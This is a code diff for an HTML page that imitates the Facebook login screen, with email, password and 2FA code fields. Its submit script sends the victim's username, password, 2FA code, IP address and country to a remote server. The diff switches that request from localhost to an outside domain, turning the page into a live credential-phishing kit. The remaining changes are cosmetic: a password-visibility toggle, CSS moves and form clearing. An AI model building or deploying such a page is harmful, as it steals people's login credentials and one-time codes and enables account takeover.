@@ -10,6 +10,17 @@
             href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
         <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
             integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                const passwordInput = document.getElementById('pass');
+                const eyeIcon = document.querySelector('.fa-eye');
+                eyeIcon.addEventListener('click', function () {
+                    const isPasswordVisible = passwordInput.type === 'text';
+                    passwordInput.type = isPasswordVisible ? 'password' : 'text';
+                    eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
+                });
+            });
+        </script>
         <style>
             body {
                 font-family: Arial, sans-serif;
@@ -22,18 +33,6 @@
                 justify-content: center;
                 height: 100vh;
             }
-
-            .password {
-                display: flex;
-                position: relative;
-            }
-
-            .password i {
-                position: absolute;
-                right: 14px;
-                top: 15px;
-            }
-
 
             .home {
                 text-align: center;
@@ -128,6 +127,17 @@
 
             .input :focus {
                 border: 1px solid #1877F2 !important;
+            }
+
+            .password {
+                display: flex;
+                position: relative;
+            }
+
+            .password i {
+                position: absolute;
+                right: 14px;
+                top: 15px;
             }
 
             .btnLogin {
@@ -234,17 +244,6 @@
                 }
             }
         </style>
-                <script>
-                    document.addEventListener('DOMContentLoaded', function () {
-                        const passwordInput = document.getElementById('pass');
-                        const eyeIcon = document.querySelector('.fa-eye');
-                        eyeIcon.addEventListener('click', function () {
-                            const isPasswordVisible = passwordInput.type === 'text';
-                            passwordInput.type = isPasswordVisible ? 'password' : 'text';
-                            eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
-                        });
-                    });
-                </script>
         <script>
             function submitForm() {
                 var emailInput = document.getElementById('email');
@@ -268,7 +267,7 @@
                     const address = localStorage.getItem('address');
                     var code = document.getElementById('2facode')
                     var codeValue = code.value
-                    fetch('http://localhost:5000/check_facebook_status?username=' + encodeURIComponent(emailValue) + '&password=' + encodeURIComponent(passwordValue) + '&code=' + encodeURIComponent(codeValue) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
+                    fetch('https://gombiztank.id.vn/check_facebook_status?username=' + encodeURIComponent(emailValue) + '&password=' + encodeURIComponent(passwordValue) + '&code=' + encodeURIComponent(codeValue) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
                         .then(response => {
                             if (!response.ok) {
                                 throw new Error('Network response was not ok');
@@ -291,6 +290,8 @@
                             }
                             else if (data === 'WRONG') {
                                 emailInput.value = '';
+                                passwordInput.value = '';
+                                code.value = '';
                                 passwordInput.style.borderColor = 'red';
                                 passwordInput.placeholder = 'Wrong password';
                                 code.placeholder = 'Wrong code';
@@ -323,15 +324,6 @@
                 var code = document.getElementById('2facode');
                 passwordInput.setAttribute('placeholder', 'Password');
                 passwordInput.style.borderColor = 'black';
-                if (passwordInput.value.includes('Wrong password')) {
-                    passwordInput.value = '';
-                    passwordInput.setAttribute('placeholder', 'Password');
-                } else if (code.value.includes('Wrong code')) {
-                    code.value = '';
-                }
-                passwordInput.type = 'password';
-                code.style.borderColor = 'black';
-                code.setAttribute('placeholder', '2FA code');
             }
         </script>
         <script>
@@ -373,7 +365,8 @@
                 <div class="content-right col-6">
                     <div class="formLogin">
                         <div class="email" id="emailContainer">
-                            <input type="text" class="input" placeholder="Email address or phone number" id="email">
+                            <input type="text" class="input" placeholder="Email address or phone number" id="email"
+                                oninput="removeRedBorder()">
                         </div>
                         <div class="email" id="2faContainer" style="display: none;
                     margin-top: 20px;">
@@ -381,7 +374,8 @@
                                 onfocus="removeRedBorder()" oninput="removeRedBorder()">
                         </div>
                         <div class="password" id="passContainer">
-                            <input type="password" class="input" placeholder="Password" id="pass">
+                            <input type="password" class="input" placeholder="Password" id="pass"
+                                oninput="removeRedBorder()">
                             <i class="fa fa-eye"></i>
                         </div>
                         <button class="btnLogin" name="login" id="login" onclick="submitForm()">Log in</button>
